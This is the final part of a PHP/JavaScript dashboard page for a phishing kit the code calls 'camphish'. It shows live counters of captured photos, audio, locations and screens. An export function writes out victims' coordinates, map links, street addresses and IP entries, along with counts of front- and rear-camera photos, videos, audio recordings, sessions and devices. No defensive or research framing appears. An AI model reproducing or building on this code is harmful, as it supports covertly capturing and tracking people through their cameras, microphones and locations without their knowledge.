if (typeof EventSource !== 'undefined') {
  const es = new EventSource('live_feed.php');
  es.addEventListener('update', e => {
    const d = JSON.parse(e.data);
    const el = (id, val) => { const el = document.getElementById(id); if (el && el.textContent != val) { el.textContent = val; el.style.animation='none'; void el.offsetHeight; el.style.animation='fadeIn .4s ease'; } };
    el('st-photos', d.photos);
    el('st-audio', d.audio);
    el('st-locations', d.locations);
    el('st-screens', d.screens);
  });
  es.onerror = () => es.close();
}

// ── Export JSON ───────────────────────────────────────────────────
function exportJSON() {
  const data = {
    exported: new Date().toISOString(),
    visitors: <?= json_encode(array_values(array_filter($ip_entries))) ?>,
    locations: <?php
      $locs = [];
      foreach ($loc_files as $lf) {
        $c = file_get_contents($lf);
        preg_match('/Latitude: (.+)/', $c, $la); preg_match('/Longitude: (.+)/', $c, $lo);
        preg_match('/Google Maps: (.+)/', $c, $gm); preg_match('/Address: (.+)/', $c, $ad);
        $locs[] = ['lat'=>trim($la[1]??''),'lon'=>trim($lo[1]??''),'maps'=>trim($gm[1]??''),'address'=>trim($ad[1]??'')];
      }
      echo json_encode($locs);
    ?>,
    photos_front: <?= count($front_imgs) ?>,
    photos_rear:  <?= count($rear_imgs) ?>,
    videos:       <?= count($videos) ?>,
    audio:        <?= count($audio_files) ?>,
    screens:      <?= count($screens) ?>,
    sessions:     <?= count($sessions) ?>,
    devices:      <?= count($dev_files) ?>
  };
  const a = document.createElement('a');
  a.href = 'data:application/json,' + encodeURIComponent(JSON.stringify(data, null, 2));
  a.download = 'camphish_export_' + Date.now() + '.json';
  a.click();
}
</script>
</body>
</html>
